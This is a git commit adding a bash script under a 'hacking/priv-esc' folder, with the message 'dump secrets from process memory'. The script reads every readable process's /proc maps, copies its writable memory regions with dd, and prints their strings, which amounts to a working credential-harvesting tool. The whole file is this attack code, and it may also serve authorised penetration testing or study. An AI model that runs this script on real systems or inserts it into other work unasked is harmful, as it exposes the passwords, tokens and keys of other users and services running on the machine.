551d7b4c8765404c3fe6cc3f4fcf2e93fd18e3b8
Nicholas Long <nicholas.eden.long@gmail.com>
2022-02-21 07:05:43 +0000

    dump secrets from process memory

---
+++ hacking/priv-esc/strings-all-memory.sh
@@ -0,0 +1,31 @@
+#!/bin/bash
+
+# run strings on memory dumps for every readable process
+
+procdump()
+(
+    cat /proc/$1/maps | grep "rw-p" | awk '{print $1}' | ( IFS="-"
+    while read a b; do
+        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
+           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
+    done )
+)
+
+tf=$(mktemp)
+rm $tf
+mkdir $tf
+cd $tf
+
+find /proc -type f -readable 2>/dev/null \
+  | grep '/proc/[[:digit:]]\+/mem' \
+  | cut -d '/' -f 3 \
+  | while read proc; do
+      procdump $proc 2>/dev/null
+    done
+
+for f in $(ls); do
+  strings $tf/$f
+done
+
+rm -rf $tf
+
